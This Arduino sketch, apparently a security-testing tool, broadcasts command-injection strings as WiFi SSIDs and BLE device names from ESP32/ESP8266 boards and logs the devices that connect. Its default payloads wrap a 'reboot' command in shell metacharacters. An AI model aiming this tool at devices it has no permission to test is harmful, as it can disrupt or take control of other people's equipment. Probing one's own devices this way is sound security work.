/*
   Project Name: CommandInWiFi
   Description: SSID and BLE-name injection test tool. Broadcasts test
   payloads as WiFi SSIDs and/or BLE Complete Local Names from an ESP32 or
   ESP8266 so you can probe how nearby devices parse those fields. ESP8266
   only supports the WiFi radio. ESP32 supports both, individually or at
   the same time. The host dashboard drives everything over the CIW serial
   protocol.
*/

#ifdef ESP32
  #include <WiFi.h>
  #include <esp_wifi.h>
  #include <BLEDevice.h>
  #include <BLEUtils.h>
  #include <BLEServer.h>
  #include <BLEAdvertising.h>
#else
  #include <ESP8266WiFi.h>
  #include <ESP8266WiFiType.h>
#endif

// Default payloads used until the dashboard pushes a real queue.
const char* defaultSSIDs[] = {"|reboot|", "&reboot&", "`reboot`", "$reboot$"};
const int defaultCount = sizeof(defaultSSIDs) / sizeof(defaultSSIDs[0]);

#define MAX_PAYLOADS 256
String payloadQueue[MAX_PAYLOADS];
int queueCount = 0;
bool isRunning = false;
bool useDashboard = false;  // becomes true after the first CIW command

// Radio mode: 0=wifi, 1=ble (ESP32 only), 2=both (ESP32 only).
// ESP8266 forces mode 0 regardless of dashboard request.
#define MODE_WIFI 0
#define MODE_BLE  1
#define MODE_BOTH 2
int radioMode = MODE_WIFI;

String currentSSID = "";  // active broadcast name (WiFi or BLE)

#ifndef ESP32
WiFiEventHandler stationConnectedHandler;
WiFiEventHandler stationDisconnectedHandler;
#endif

#ifdef ESP32
BLEServer* bleServer = nullptr;
BLEAdvertising* bleAdv = nullptr;
bool bleStarted = false;

class CIWServerCallbacks : public BLEServerCallbacks {
  void onConnect(BLEServer* server) override {
    // Best-effort MAC. The Arduino BLE wrapper does not expose the peer
    // MAC on this callback in a portable way, so we report a placeholder.
    // Real attribution comes from the disconnect event when the stack
    // includes the address. For the detector, the consistent placeholder
    // is fine because it pairs with the matching disconnect.
    Serial.print("CIW:BLE_CONNECT:00:00:00:00:00:00|");
    Serial.println(currentSSID);
  }
  void onDisconnect(BLEServer* server) override {
    Serial.print("CIW:BLE_DISCONNECT:00:00:00:00:00:00|");
    Serial.println(currentSSID);
    // Resume advertising; the stack stops adv on connect by default.
    if (bleAdv) bleAdv->start();
  }
};
#endif

unsigned int ssidIndex = 0;

unsigned long lastChangeMillis = 0;
unsigned long lastDeviceListMillis = 0;
const long ssidChangeInterval = 2 * 60 * 1000; // 2 minutes
const long deviceListInterval = 60 * 1000;     // 1 minute

String serialBuffer = "";

// Minimal base64 decoder so we do not need an extra library.
static const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

int b64index(char c) {
  if (c == '=') return 0;
  for (int i = 0; i < 64; i++) {
    if (b64chars[i] == c) return i;
  }
  return -1;
}

String b64decode(const String &input) {
  String output = "";
  int len = input.length();
  for (int i = 0; i < len; i += 4) {
    int a = b64index(input[i]);
    int b = (i + 1 < len) ? b64index(input[i + 1]) : 0;
    int c = (i + 2 < len) ? b64index(input[i + 2]) : 0;
    int d = (i + 3 < len) ? b64index(input[i + 3]) : 0;

    output += (char)((a << 2) | (b >> 4));
    if (i + 2 < len && input[i + 2] != '=')
      output += (char)(((b & 0x0F) << 4) | (c >> 2));
    if (i + 3 < len && input[i + 3] != '=')
      output += (char)(((c & 0x03) << 6) | d);
  }
  return output;
}

void setup() {
  Serial.begin(115200);
  while (!Serial) { ; }
  Serial.println("CIW:BOOT");
#ifdef ESP32
  Serial.println("CommandInWiFi v2.2 (ESP32, WiFi + BLE)");
#else
  Serial.println("CommandInWiFi v2.2 (ESP8266, WiFi only)");
#endif

  WiFi.mode(WIFI_AP);

#ifdef ESP32
  WiFi.onEvent([](WiFiEvent_t event, WiFiEventInfo_t info) {
    char mac[18];
    uint8_t* m = info.wifi_ap_staconnected.mac;
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             m[0], m[1], m[2], m[3], m[4], m[5]);
    Serial.print("CIW:STA_CONNECT:");
    Serial.print(mac);
    Serial.print("|");
    Serial.println(currentSSID);
  }, ARDUINO_EVENT_WIFI_AP_STACONNECTED);

  WiFi.onEvent([](WiFiEvent_t event, WiFiEventInfo_t info) {
    char mac[18];
    uint8_t* m = info.wifi_ap_stadisconnected.mac;
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             m[0], m[1], m[2], m[3], m[4], m[5]);
    Serial.print("CIW:STA_DISCONNECT:");
    Serial.print(mac);
    Serial.print("|");
    Serial.println(currentSSID);
  }, ARDUINO_EVENT_WIFI_AP_STADISCONNECTED);
#else
  stationConnectedHandler = WiFi.onSoftAPModeStationConnected(
    [](const WiFiEventSoftAPModeStationConnected& evt) {
      char mac[18];
      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
               evt.mac[0], evt.mac[1], evt.mac[2], evt.mac[3], evt.mac[4], evt.mac[5]);
      Serial.print("CIW:STA_CONNECT:");
      Serial.print(mac);
      Serial.print("|");
      Serial.println(currentSSID);
    });

  stationDisconnectedHandler = WiFi.onSoftAPModeStationDisconnected(
    [](const WiFiEventSoftAPModeStationDisconnected& evt) {
      char mac[18];
      snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
               evt.mac[0], evt.mac[1], evt.mac[2], evt.mac[3], evt.mac[4], evt.mac[5]);
      Serial.print("CIW:STA_DISCONNECT:");
      Serial.print(mac);
      Serial.print("|");
      Serial.println(currentSSID);
    });
#endif

  changeName();
  isRunning = true;
  Serial.print("CIW:MODE:");
  Serial.println(modeString(radioMode));
  Serial.println("CIW:READY");
}

void loop() {
  unsigned long currentMillis = millis();

  checkSerialCommand();

  if (isRunning && currentMillis - lastChangeMillis >= ssidChangeInterval) {
    lastChangeMillis = currentMillis;
    changeName();
  }

  if (currentMillis - lastDeviceListMillis >= deviceListInterval) {
    lastDeviceListMillis = currentMillis;
    listConnectedDevices();
  }
}

const char* modeString(int m) {
  switch (m) {
    case MODE_WIFI: return "wifi";
    case MODE_BLE:  return "ble";
    case MODE_BOTH: return "both";
    default:        return "wifi";
  }
}

void checkSerialCommand() {
  while (Serial.available()) {
    char c = Serial.read();
    if (c == '\n' || c == '\r') {
      serialBuffer.trim();
      if (serialBuffer.length() > 0) {
        processCommand(serialBuffer);
      }
      serialBuffer = "";
    } else {
      serialBuffer += c;
    }
  }
}

void processCommand(const String &cmd) {
  if (cmd == "CIW:CLEAR") {
    queueCount = 0;
    ssidIndex = 0;
    useDashboard = true;
    Serial.println("CIW:OK:CLEAR");

  } else if (cmd.startsWith("CIW:ADD:")) {
    if (queueCount >= MAX_PAYLOADS) {
      Serial.println("CIW:ERR:Queue full (max " + String(MAX_PAYLOADS) + ")");
      return;
    }
    String b64 = cmd.substring(8);
    String decoded = b64decode(b64);
    payloadQueue[queueCount] = decoded;
    queueCount++;
    useDashboard = true;
    Serial.println("CIW:OK:ADD:" + String(queueCount - 1));

  } else if (cmd == "CIW:START") {
    if (getActiveCount() == 0) {
      Serial.println("CIW:ERR:No payloads in queue");
      return;
    }
    isRunning = true;
    ssidIndex = 0;
    lastChangeMillis = millis();
    useDashboard = true;
    changeName();
    Serial.println("CIW:OK:START:" + String(getActiveCount()));

  } else if (cmd == "CIW:STOP") {
    isRunning = false;
    Serial.println("CIW:OK:STOP");

  } else if (cmd == "CIW:STATUS") {
    String state = isRunning ? "running" : "stopped";
    Serial.println("CIW:STATUS:" + state + ":" + String(getActiveCount()) + ":" + String(ssidIndex));

  } else if (cmd.startsWith("CIW:MODE:")) {
    String want = cmd.substring(9);
    want.trim();
    int newMode = radioMode;
    if (want == "wifi")      newMode = MODE_WIFI;
    else if (want == "ble")  newMode = MODE_BLE;
    else if (want == "both") newMode = MODE_BOTH;
    else {
      Serial.println("CIW:ERR:Unknown mode (use wifi, ble, both)");
      return;
    }
#ifndef ESP32
    if (newMode != MODE_WIFI) {
      Serial.println("CIW:ERR:ESP8266 supports wifi mode only");
      return;
    }
#endif
    radioMode = newMode;
    Serial.print("CIW:OK:MODE:");
    Serial.println(modeString(radioMode));
    Serial.print("CIW:MODE:");
    Serial.println(modeString(radioMode));
    // Re-apply the current payload through the new radio set.
    if (isRunning) changeName();

  } else {
    Serial.println("CIW:ERR:Unknown command");
  }
}

int getActiveCount() {
  return useDashboard ? queueCount : defaultCount;
}

// Pick the next payload string and broadcast it through whichever radios
// are enabled. We do not stop a radio when switching mode mid-run; we just
// let the next rotation re-apply.
void changeName() {
  int count = getActiveCount();
  if (count == 0) return;

  const char* newName;
  String dynamicName;

  if (useDashboard && queueCount > 0) {
    dynamicName = payloadQueue[ssidIndex % queueCount];
    newName = dynamicName.c_str();
  } else {
    newName = defaultSSIDs[ssidIndex % defaultCount];
  }

  currentSSID = String(newName);

  if (radioMode == MODE_WIFI || radioMode == MODE_BOTH) {
    WiFi.softAP(newName);
    Serial.print("CIW:SSID:");
    Serial.println(newName);
  }

#ifdef ESP32
  if (radioMode == MODE_BLE || radioMode == MODE_BOTH) {
    setBleName(newName);
    Serial.print("CIW:BLE_NAME:");
    Serial.println(newName);
  } else {
    stopBle();
  }
#endif

  ssidIndex = (ssidIndex + 1) % count;
}

#ifdef ESP32
void setBleName(const char* name) {
  // Lazy-init the BLE stack on first use so users who never enable BLE do
  // not pay the RAM cost (~30 KB).
  if (!bleStarted) {
    BLEDevice::init(name);
    bleServer = BLEDevice::createServer();
    bleServer->setCallbacks(new CIWServerCallbacks());
    bleAdv = BLEDevice::getAdvertising();
    bleAdv->setScanResponse(true);
    bleAdv->setMinPreferred(0x06);
    bleAdv->setMinPreferred(0x12);
    bleStarted = true;
  }

  // Rename and rebuild the advertisement data so scanners see the new
  // payload as the Complete Local Name AD field.
  BLEDevice::setDeviceName(name);
  if (bleAdv) {
    bleAdv->stop();
    BLEAdvertisementData adv;
    adv.setName(name);
    adv.setFlags(0x06);
    bleAdv->setAdvertisementData(adv);
    bleAdv->start();
  }
}

void stopBle() {
  if (bleStarted && bleAdv) {
    bleAdv->stop();
  }
}
#endif

void listConnectedDevices() {
#ifdef ESP32
  wifi_sta_list_t stationList;
  tcpip_adapter_sta_list_t adapterList;

  esp_wifi_ap_get_sta_list(&stationList);
  tcpip_adapter_get_sta_list(&stationList, &adapterList);

  if (adapterList.num == 0) return;

  for (int i = 0; i < adapterList.num; i++) {
    tcpip_adapter_sta_info_t station = adapterList.sta[i];
    String ip = IPAddress(station.ip.addr).toString();
    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             station.mac[0], station.mac[1], station.mac[2],
             station.mac[3], station.mac[4], station.mac[5]);
    Serial.println("CIW:DEVICE:" + ip + "|" + String(mac));
  }
#else
  struct station_info *station_list = wifi_softap_get_station_info();

  if (station_list == NULL) return;

  while (station_list != NULL) {
    String ip = IPAddress((&station_list->ip)->addr).toString();
    String mac = macToString(station_list->bssid);
    Serial.println("CIW:DEVICE:" + ip + "|" + mac);
    station_list = STAILQ_NEXT(station_list, next);
  }
  wifi_softap_free_station_info();
#endif
}

#ifndef ESP32
String macToString(const uint8_t* mac) {
  char buf[20];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}
#endif
